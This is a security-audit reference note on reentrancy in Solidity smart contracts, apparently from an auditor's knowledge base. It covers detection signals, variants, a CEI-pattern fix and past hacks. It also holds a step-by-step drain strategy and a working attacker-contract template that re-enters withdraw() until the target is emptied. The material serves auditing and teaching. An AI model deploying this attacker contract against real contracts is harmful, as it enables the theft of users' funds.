# Reentrancy

tags: #vulnerability #critical #reentrancy

---

## Summary
A reentrancy attack occurs when an external contract is called before state updates are finalized, allowing the attacker to recursively call back into the vulnerable function.

---

## Pattern Recognition

### Code Signals
- External call (`.call()`, `.transfer()`, interface call) before state update
- `withdraw()` or `claimReward()` functions
- ETH transfers without ReentrancyGuard
- `nonReentrant` modifier missing

### Detection Query for Claude
```
Does this function make an external call before updating state?
Is there a way to recursively re-enter this function?
Is ReentrancyGuard applied?
```

---

## Variants

### Single-Function Reentrancy
Classic: `withdraw()` → receive() → `withdraw()`

### Cross-Function Reentrancy
`functionA()` calls external → reenter `functionB()` which reads stale state

### Cross-Contract Reentrancy
Contract A calls external → reenters Contract B which shares state with A

### Read-Only Reentrancy
Call external → reenter view function that returns stale values → use stale value in another protocol

---

## Attack Strategy

```
1. Deposit funds into vulnerable contract
2. Call withdraw()
3. In receive()/fallback(), call withdraw() again
4. State not yet updated → contract thinks attacker still has balance
5. Repeat until drained
```

---

## Detection Signals
- `external call` BEFORE `state update`
- No `nonReentrant` modifier
- ETH sent via `.call{value: amount}("")`
- `balances[msg.sender] = 0` AFTER the send

---

## PoC Template

```solidity
contract ReentrancyAttacker {
    IVulnerable target;
    uint256 amount;

    constructor(address _target) payable {
        target = IVulnerable(_target);
        amount = msg.value;
    }

    function attack() external {
        target.deposit{value: amount}();
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
}
```

---

## Fix

```solidity
// Apply CEI pattern
function withdraw(uint256 amount) external nonReentrant {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;  // Effect BEFORE interaction
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
}
```

---

## Real World Examples
- The DAO Hack (2016) — $60M
- Cream Finance (2021) — $130M
- Fei Protocol (2022) — $80M

---

## Links
- [[attack-patterns/state-inconsistency]]
- [[test-strategies/fuzzing]]
- [[poc/reentrancy-poc]]
